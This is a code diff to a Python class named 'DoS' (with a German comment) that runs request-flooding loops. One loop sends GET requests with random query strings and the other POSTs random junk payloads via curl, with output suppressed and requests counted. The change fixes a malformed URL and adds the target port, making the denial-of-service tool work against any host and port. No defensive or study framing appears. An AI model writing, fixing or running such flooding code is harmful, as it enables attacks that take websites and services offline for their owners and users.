@@ -44,7 +44,7 @@ class DoS:
         while self.running:
             try:
                 # curl macht SSL automatisch bei https://
-                cmd = f"curl -sk https://{self.target_ip}/? {random.randint(1,999999)} -m 2"
+                cmd = f"curl -sk https://{self.target_ip}:{self.target_port}/?{random.randint(1,999999)} -m 2"
                 subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 self.count += 1
             except:
@@ -79,7 +79,7 @@ class DoS:
         while self.running:
             try:
                 data = "X" * random.randint(1000, 5000)
-                cmd = f"curl -sk https://{self.target_ip}/ -X POST -d 'data={data}' -m 2"
+                cmd = f"curl -sk https://{self.target_ip}:{self.target_port}/ -X POST -d 'data={data}' -m 2"
                 subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 self.count += 1
             except:
